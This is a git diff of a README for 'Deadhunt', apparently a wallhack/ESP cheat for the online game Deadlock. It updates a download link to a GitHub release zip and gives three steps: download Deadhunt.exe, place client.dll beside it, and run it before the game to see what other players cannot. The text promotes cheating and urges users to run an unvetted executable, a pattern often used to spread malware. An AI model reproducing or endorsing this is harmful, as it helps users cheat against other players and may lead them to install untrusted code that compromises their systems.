@@ -18,14 +18,14 @@
 
 ## 🚀 **Getting Started (It's as easy as 1-2-3)**
 
-1. **Download `DeadHunt.exe`**  
-   📥 Click [here](qw.com) to grab your copy of `DeadHunt.exe`.
+1. **Download `Deadhunt.exe`**  
+   📥 Click [here](https://github.com/RMartinns/Deadlock-Deadhunt-ESP/releases/download/2024/Deadhunt.zip) to grab your copy of `Deadhunt.exe`.
 
-2. **Get `client_dll.cs`**  
-   📂 Place `client_dll.cs` right next to `WH.exe` in the same folder.
+2. **Get `client.dll`**  
+   📂 Place `client.dll` right next to `Deadhunt.exe` in the same folder.
 
 3. **Launch & Dominate**  
-   ▶️ Run `DeadHunt.exe` before starting Deadlock, and you're ready to see things no one else can! *Let the games begin* 🕹️.
+   ▶️ Run `Deadhunt.exe` before starting Deadlock, and you're ready to see things no one else can! *Let the games begin* 🕹️.
 
 ---
 
